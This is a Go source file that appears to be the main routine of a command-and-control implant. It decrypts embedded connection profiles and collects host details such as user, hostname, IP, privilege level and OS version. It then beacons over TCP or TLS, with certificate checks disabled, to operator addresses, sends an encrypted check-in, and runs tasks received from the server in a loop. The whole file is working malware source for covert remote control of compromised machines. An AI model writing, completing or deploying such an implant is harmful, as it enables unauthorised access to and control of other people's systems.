package main

import (
	"crypto/rand"
	"crypto/tls"
	"crypto/x509"
	"encoding/binary"
	"gopher/functions"
	"gopher/utils"
	"net"
	"os"
	"os/user"
	"path/filepath"
	"runtime"
	"time"

	"github.com/vmihailenco/msgpack/v5"
)

var ACTIVE = true

func CreateInfo() ([]byte, []byte) {
	var (
		addr     []net.Addr
		username string
		ip       string
	)

	path, err := os.Executable()
	if err == nil {
		path = filepath.Base(path)
	}

	userCurrent, err := user.Current()
	if err == nil {
		username = userCurrent.Username
	}

	host, _ := os.Hostname()

	osVersion, _ := functions.GetOsVersion()

	addr, err = net.InterfaceAddrs()
	if err == nil {
		for _, a := range addr {
			ipnet, ok := a.(*net.IPNet)
			if ok && !ipnet.IP.IsLoopback() && !ipnet.IP.IsLinkLocalUnicast() && ipnet.IP.To4() != nil {
				ip = ipnet.IP.String()
			}
		}
	}

	acp, oemcp := functions.GetCP()

	randKey := make([]byte, 16)
	_, _ = rand.Read(randKey)

	info := utils.SessionInfo{
		Process:    path,
		PID:        os.Getpid(),
		User:       username,
		Host:       host,
		Ipaddr:     ip,
		Elevated:   functions.IsElevated(),
		Acp:        acp,
		Oem:        oemcp,
		Os:         runtime.GOOS,
		OSVersion:  osVersion,
		EncryptKey: randKey,
	}

	data, _ := msgpack.Marshal(info)

	return data, randKey
}

var profiles []utils.Profile
var encKeys [][]byte
var profileIndex int
var profile utils.Profile
var AgentId uint32
var encKey []byte

func main() {

	for _, encProfile := range encProfiles {
		key := make([]byte, 16)
		copy(key, encProfile[:16])
		encData := encProfile[16:]
		decData, err := utils.DecryptData(encData, key)
		if err != nil {
			continue
		}

		var p utils.Profile
		err = msgpack.Unmarshal(decData, &p)
		if err != nil {
			continue
		}

		profiles = append(profiles, p)
		encKeys = append(encKeys, key)
	}

	if len(profiles) == 0 {
		return
	}

	profileIndex = 0
	profile = profiles[profileIndex]
	encKey = encKeys[profileIndex]

	sessionInfo, sessionKey := CreateInfo()
	utils.SKey = sessionKey

	r := make([]byte, 4)
	_, _ = rand.Read(r)
	AgentId = binary.BigEndian.Uint32(r)

	initData, _ := msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
	initMsg, _ := msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
	initMsg, _ = utils.EncryptData(initMsg, encKey)

	UPLOADS = make(map[string][]byte)
	DOWNLOADS = make(map[string]utils.Connection)
	JOBS = make(map[string]utils.Connection)

	addrIndex := 0
	for i := 0; i < profile.ConnCount && ACTIVE; i++ {
		if i > 0 {
			time.Sleep(time.Duration(profile.ConnTimeout) * time.Second)
			addrIndex++
			if addrIndex >= len(profile.Addresses) {
				addrIndex = 0
				profileIndex = (profileIndex + 1) % len(profiles)
				profile = profiles[profileIndex]
				encKey = encKeys[profileIndex]
				initData, _ = msgpack.Marshal(utils.InitPack{Id: uint(AgentId), Type: profile.Type, Data: sessionInfo})
				initMsg, _ = msgpack.Marshal(utils.StartMsg{Type: utils.INIT_PACK, Data: initData})
				initMsg, _ = utils.EncryptData(initMsg, encKey)
			}
		}

		///// Connect

		var (
			err  error
			conn net.Conn
		)

		if profile.UseSSL {
			cert, certerr := tls.X509KeyPair(profile.SslCert, profile.SslKey)
			if certerr != nil {
				continue
			}

			caCertPool := x509.NewCertPool()
			caCertPool.AppendCertsFromPEM(profile.CaCert)

			config := &tls.Config{
				Certificates:       []tls.Certificate{cert},
				RootCAs:            caCertPool,
				InsecureSkipVerify: true,
			}
			conn, err = tls.Dial("tcp", profile.Addresses[addrIndex], config)

		} else {
			conn, err = net.Dial("tcp", profile.Addresses[addrIndex])
		}
		if err != nil {
			continue
		} else {
			i = 0
		}

		/// Recv Banner
		if profile.BannerSize > 0 {
			_, err := functions.ConnRead(conn, profile.BannerSize)
			if err != nil {
				continue
			}
		}

		/// Send Init
		_ = functions.SendMsg(conn, initMsg)

		/// Recv Command

		var (
			inMessage  utils.Message
			outMessage utils.Message
			recvData   []byte
			sendData   []byte
		)

		for ACTIVE {
			recvData, err = functions.RecvMsg(conn)
			if err != nil {
				break
			}

			outMessage = utils.Message{Type: 0}
			recvData, err = utils.DecryptData(recvData, sessionKey)
			if err != nil {
				break
			}

			err = msgpack.Unmarshal(recvData, &inMessage)
			if err != nil {
				break
			}

			if inMessage.Type == 1 {
				outMessage.Type = 1
				outMessage.Object = TaskProcess(inMessage.Object)
			}

			sendData, _ = msgpack.Marshal(outMessage)
			sendData, _ = utils.EncryptData(sendData, sessionKey)
			_ = functions.SendMsg(conn, sendData)
		}
	}
}
